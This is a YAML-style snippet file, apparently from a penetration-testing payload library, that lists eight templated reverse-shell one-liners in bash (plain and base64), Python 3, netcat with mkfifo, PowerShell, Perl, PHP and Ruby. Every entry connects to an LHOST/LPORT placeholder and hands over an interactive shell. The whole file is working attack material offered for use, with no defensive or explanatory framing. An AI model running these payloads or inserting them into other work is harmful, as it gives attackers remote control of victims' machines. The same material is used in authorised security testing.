category: reverse-shell
snippets:
  - {key: rshell-bash-linux,      desc: "bash TCP reverse shell", payload: "bash -c 'bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1'"}
  - {key: rshell-bash-b64,        desc: "bash base64-encoded reverse shell", payload: "echo -n 'bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1' | base64 -w0"}
  - {key: rshell-python3,         desc: "Python 3 reverse shell", payload: "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{{LHOST}}\",{{LPORT}}));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call([\"/bin/sh\",\"-i\"])'"}
  - {key: rshell-nc-mkfifo,       desc: "nc + mkfifo (when nc has no -e)", payload: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {{LHOST}} {{LPORT}} >/tmp/f"}
  - {key: rshell-powershell-tcp,  desc: "PowerShell TCP reverse shell", payload: "powershell -nop -c \"$c=New-Object System.Net.Sockets.TCPClient('{{LHOST}}',{{LPORT}});$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sh=$sb+'PS '+(pwd).Path+'> ';$sb2=([text.encoding]::ASCII).GetBytes($sh);$s.Write($sb2,0,$sb2.Length);$s.Flush()};$c.Close()\""}
  - {key: rshell-perl,            desc: "Perl reverse shell", payload: "perl -e 'use Socket;$i=\"{{LHOST}}\";$p={{LPORT}};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"}
  - {key: rshell-php,             desc: "PHP reverse shell", payload: "php -r '$sock=fsockopen(\"{{LHOST}}\",{{LPORT}});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"}
  - {key: rshell-ruby,            desc: "Ruby reverse shell", payload: "ruby -rsocket -e'f=TCPSocket.open(\"{{LHOST}}\",{{LPORT}}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"}
